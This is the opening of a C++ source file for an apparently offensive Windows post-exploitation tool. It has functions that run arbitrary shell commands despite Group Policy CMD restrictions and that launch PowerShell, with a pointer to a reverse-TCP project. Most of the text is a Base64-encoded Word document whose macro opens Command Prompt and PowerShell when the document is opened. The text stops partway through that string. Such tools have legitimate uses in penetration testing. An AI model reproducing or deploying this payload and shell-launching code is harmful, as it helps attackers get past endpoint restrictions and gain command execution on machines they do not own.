// Copyright (c) 2019 Ivan Sincek
// v5.7.3

#include ".\invoker_interactive.h"
#include ".\lib\invoker\invoker.h"
#if _WIN64
#include ".\lib\invoker_syscalls\invoker_syscalls.h"
#endif

// --------------------------------------- SECTION: GLOBALS

// NOTE: The hook thread information.
Invoker::HOOK hInfo = { };

// NOTE: The WMI information.
Invoker::WMI wInfo = { "WQL", "ROOT\\CIMV2" };

namespace InvokerInteractive {

	// --------------------------------------- SECTION: SYSTEM

	void InvokeCMD() {
		printf("################################## EXAMPLES ##################################\n");
		printf("# Command : WHOAMI /PRIV                                                     #\n");
		printf("#################################### NOTE ####################################\n");
		printf("# If CMD is disabled in the Group Policy settings, try entering a command.   #\n");
		printf("##############################################################################\n");
		printf("\n");
		std::string command = Invoker::Input("Enter command (optional)");
		printf("\n");
		Invoker::ShellExec(command);
	}

	void InvokePS() {
		printf("#################################### NOTE ####################################\n");
		printf("# My other project at github.com/ivan-sincek/powershell-reverse-tcp.         #\n");
		printf("##############################################################################\n");
		printf("\n");
		Invoker::PowerShellExec();
	}

	void InvokeWordMacro() {
		printf("#################################### NOTE ####################################\n");
		printf("# Command Prompt and PowerShell will run in a new window on document open.   #\n");
		printf("##############################################################################\n");
		printf("\n");
		// NOTE: An MS Word document with a macro, encoded in Base64.
		std::string file = std::string("0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAAMAAAAAAAAAAAEAAAMwAAAAIAAAD+////AAAAAC8AAAD/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////").append("////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////").append("///////////////////////////////////////////////////////////////////////////////////spcEAKQAJBAAA8BK/AAAAAAAAEAAAAAAACAAAfwgAAA4AYmpiavSg9KAAAAAAAAAAAAAAAAAAAAAAAAAJBBYANA4AAJbKNGiWyjRofwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//w8AAAAAAAAAAAD//w8AAAAAAAAAAAD//w8AAAAAAAAAAAAAAAAAAAAAALcAAAAAAE4HAAAA").append("AAAATgcAAOAUAAAAAAAA4BQAAAAAAADgFAAAAAAAAOAUAAAAAAAA4BQAABQAAAAAAAAAAAAAAP////8AAAAA9BQAAAAAAAD0FAAAAAAAAPQUAAAAAAAA9BQAAAwAAAAAFQAADAAAAPQUAAAAAAAAwBcAAAwCAAAMFQAAAAAAAAwVAAAAAAAADBUAAAAAAAAMFQAAAAAAAAwVAAAAAAAA5xUAAAAAAADnFQAAAAAAAOcVAAAAAAAAPxcAAAIAAABBFwAAAAAAAEEXAAAAAAAAQRcAAAAAAABBFwAAAAAAAEEX").append("AAAAAAAAQRcAACQAAADMGQAAtgIAAIIcAABAAAAAZRcAABUAAAAAAAAAAAAAAAAAAAAAAAAA4BQAAAAAAADnFQAAAAAAAAAAAAAAAAAAAAAAAAAAAADnFQAAAAAAAOcVAAAAAAAA5xUAAAAAAADnFQAAAAAAAGUXAAAAAAAAAAAAAAAAAADgFAAAAAAAAOAUAAAAAAAADBUAAAAAAAAAAAAAAAAAAAwVAADbAAAAehcAABYAAADnFgAAAAAAAOcWAAAAAAAA5xYAAAAAAADnFQAAuAAAAOAUAAAAAAAADBUA").append("AAAAAADgFAAAAAAAAAwVAAAAAAAAPxcAAAAAAAAAAAAAAAAAAOcWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5xUAAAAAAAA/FwAAAAAAAAAAAAAAAAAA5xYAAAAAAAAAAAAAAAAAAOcWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5xYAAAAAAAAMFQAA").append("AAAAAP////8AAAAAUMfs1nYu2AEAAAAAAAAAAP////8AAAAAnxYAABwAAADnFgAAAAAAAAAAAAAAAAAAKxcAABQAAACQFwAAMAAAAMAXAAAAAAAA5xYAAAAAAADCHAAAAAAAALsWAAAcAAAAwhwAAAAAAADnFgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMIcAAAAAAAAAAAAAAAAAADgFAAAAAAAAOcWAABE").append("AAAA5xUAAAAAAADnFQAAAAAAAOcWAAAAAAAA5xUAAAAAAADnFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5xUAAAAAAADnFQAAAAAAAOcVAAAAAAAAZRcAAAAAAABlFwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1xYAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOcVAAAAAAAA5xUAAAAAAADnFQAAAAAAAMAXAAAAAAAA5xUAAAAA").append("AADnFQAAAAAAAOcVAAAAAAAA5xUAAAAAAAAAAAAAAAAAAP////8AAAAA/////wAAAAD/////AAAAAAAAAAAAAAAA/////wAAAAD/////AAAAAP////8AAAAA/////wAAAAD/////AAAAAP////8AAAAA/////wAAAAD/////AAAAAP////8AAAAA/////wAAAAD/////AAAAAP////8AAAAA/////wAAAAD/////AAAAAMIcAAAAAAAA5xUAAAAAAADnFQAAAAAAAOcVAAAAAAAA5xUAAAAAAADnFQAAAAAA").append("AOcVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADnFQAAAAAAAOcVAAAAAAAA5xUAAAAAAABOBwAAWAwAAKYTAAA6AQAABQASAQAACQQECAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEFmdGVyIGVuYWJsaW5nIHRoZSBjb250ZW50LCBDb21tYW5kIFByb21wdCBhbmQgUG93ZXJTaGVsbCB3aWxsIG5vdyBvcGVuIGluIGEgbmV3IHdpbmRvdy4NUHJlc3MgQWx0ICsgRjExIHRvIG9wZW4gbWFjcm8gZWRpdG9yLg0AAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAABwIAAA/CAAAQAgAAEMIAABYCAAAWQgAAGwIAAB9CAAAfggAAH8IAAD27Ozs7Ozi7OLYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEhVoaw2tABZoCw4zADUIgVwIgQASFWhrDa0AFmhXS90ANQiBXAiBABIVaGsNrQAWaPMLiQA1CIFcCIEAEhVoaw2tABZorSC8ADUIgVwIgQoACAAAWQgAAH8IAADwAAAA").append("AAAAAAAAAAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAADgAAAyQDEmTwAAEAE6R4ABSkeABhJANnZK0gvAAAAjIAMZBoATpwvEydAB+wgi4gsMZBIbCgBSKwoAUjkKAFJJCgBSWwAAAXsMQCGLDEAgyQxAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIGDwASAAEAeAEPAAcAAwAEAAMAAgAEAAgAAACYAAAAngAAAJ4AAACeAAAAngAAAJ4AAACeAAAAngAAAJ4AAAA2BgAANgYA").append("ADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAB2AgAAdgIAAHYCAAB2AgAAdgIAAHYCAAB2AgAAdgIAAHYCAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA+AgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAAqAAAADYGAAA2BgAAFgAAADYGAAA2BgAA").append("NgYAADYGAAA2BgAANgYAADYGAAA2BgAAuAAAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAAGgBAABIAQAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2").append("BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAAA2BgAANgYAADYGAABwAgAANgYAADIGAAAYAAAAxgMAANYDAADmAwAA9gMAAAYEAAAWBAAAJgQAADYEAABGBAAAVgQAAGYEAAB2BAAAhgQAAJYEAADGAwAA1gMAAOYDAAD2AwAABgQAABYEAAAyBgAAKAIAANgB").append("AADoAQAAJgQAADYEAABGBAAAVgQAAGYEAAB2BAAAhgQAAJYEAADGAwAA1gMAAOYDAAD2AwAABgQAABYEAAAmBAAANgQAAEYEAABWBAAAZgQAAHYEAACGBAAAlgQAAMYDAADWAwAA5gMAAPYDAAAGBAAAFgQAACYEAAA2BAAARgQAAFYEAABmBAAAdgQAAIYEAACWBAAAxgMAANYDAADmAwAA9gMAAAYEAAAWBAAAJgQAADYEAABGBAAAVgQAAGYEAAB2BAAAhgQAAJYEAADGAwAA1gMAAOYDAAD2AwAABgQA").append("ABYEAAAmBAAANgQAAEYEAABWBAAAZgQAAHYEAACGBAAAlgQAAMYDAADWAwAA5gMAAPYDAAAGBAAAFgQAACYEAAA2BAAARgQAAFYEAABmBAAAdgQAAIYEAACWBAAAOAEAAFgBAAD4AQAACAIAABgCAABWAgAAfgIAAJACAACgAgAAsAIAAMACAADQAgAAgAIAAOACAADwAgAAAAMAABADAAAgAwAAMAMAAEADAADgAgAA8AIAAAADAAAQAwAAIAMAADADAABAAwAA4AIAAPACAAAAAwAAEAMAACADAAAwAwAA").append("QAMAAOACAADwAgAAAAMAABADAAAgAwAAMAMAAEADAADgAgAA8AIAAAADAAAQAwAAIAMAADADAABAAwAA4AIAAPACAAAAAwAAEAMAACADAAAwAwAAQAMAAOACAADwAgAAAAMAABADAAAgAwAAMAMAAEADAADgAgAA8AIAAAADAAAQAwAAIAMAADADAABAAwAA4AIAAPACAAAAAwAAEAMAACADAAAwAwAAQAMAAOACAADwAgAAAAMAABADAAAgAwAAMAMAAEADAADgAgAA8AIAAAADAAAQAwAAIAMAADADAABA").append("AwAA4AIAAPACAAAAAwAAEAMAACADAAAwAwAAQAMAAOACAADwAgAAAAMAABADAAAgAwAAMAMAAEADAADgAgAA8AIAAAADAAAQAwAAIAMAADADAABAAwAANgYAADYGAAA2BgAANgYAADYGAAAkAAAAT0oDAFBKBABRSgMAXkoCAF9IAQRtSAkEbkgECHNICQR0SAQIAAAAAE4AAGDx/wIATgAMEAAAAAAAAAAABgBOAG8AcgBtAGEAbAAAAAwAAAASZAMBAQAUpKAAHABDShYAX0gBBGFKFgBtSBoEbkgECHNI").append("GgR0SAQIAAAAAAAAAAAAAAAAAAAAAAAARABBIPL/oQBEAAwNAAAAAAAAEAAWAEQAZQBmAGEAdQBsAHQAIABQAGEAcgBhAGcAcgBhAHAAaAAgAEYAbwBuAHQAAAAAAFIAaQDz/7MAUgAMDQAAAAAAADAGDABUAGEAYgBsAGUAIABOAG8AcgBtAGEAbAAAABwAF/YDAAA01gYAAQoDbAA01gYAAQUDAABh9gMAAAIACwAAACgAayD0/8EAKAAADQAAAAAAADAGBwBOAG8AIABMAGkAcwB0AAAAAgAMAAAAAABQ").append("SwMEFAAGAAgAAAAhAOneD7//AAAAHAIAABMAAABbQ29udGVudF9UeXBlc10ueG1srJHLTsMwEEX3SPyD5S1KnLJACCXpgseOx6J8wMiZJBbJ2LKnVfv3TNJUQqggFmws2TP3njvjcr0fB7XDmJynSq/yQisk6xtHXaXfN0/ZrVaJgRoYPGGlD5j0ur68KDeHgEmJmlKle+ZwZ0yyPY6Qch+QpNL6OALLNXYmgP2ADs11UdwY64mROOPJQ9flA7awHVg97uX5mCTikLS6PzZOrEpDCIOzwJLU7Kj5RskWQi7K").append("uSf1LqQriaHNWcJU+Rmw6F5lNdE1qN4g8guMEsOwDIlfz2cgGS3mvzueiezb1llsvN2Oso58Nl7MTsH/FGD1P+gT08x/W38CAAD//wMAUEsDBBQABgAIAAAAIQCl1qfnwAAAADYBAAALAAAAX3JlbHMvLnJlbHOEj89qwzAMh++FvYPRfVHSwxgldi+lkEMvo30A4Sh/aCIb2xvr20/HBgq7CISk7/epPf6ui/nhlOcgFpqqBsPiQz/LaOF2Pb9/gsmFpKclCFt4cIaje9u1X7xQ0aM8zTEbpUi2MJUSD4jZ").append("T7xSrkJk0ckQ0kpF2zRiJH+nkXFf1x+YnhngNkzT9RZS1zdgro+oyf+zwzDMnk/Bf68s5UUEbjeUTGnkYqGoL+NTvZCoZarUHtC1uPnW/QEAAP//AwBQSwMEFAAGAAgAAAAhAGt5lhaDAAAAigAAABwAAAB0aGVtZS90aGVtZS90aGVtZU1hbmFnZXIueG1sDMxNCsMgEEDhfaF3kNk3Y7soRWKyy6679gBDnBpBx6DSn9vX5eODN87fFNWbSw1ZLJwHDYplzS6It/B8LKcbqNpIHMUsbOHHFebpeBjJtI0T").append("30nIc1F9I9WQha213SDWtSvVIe8s3V65JGo9i0dX6NP3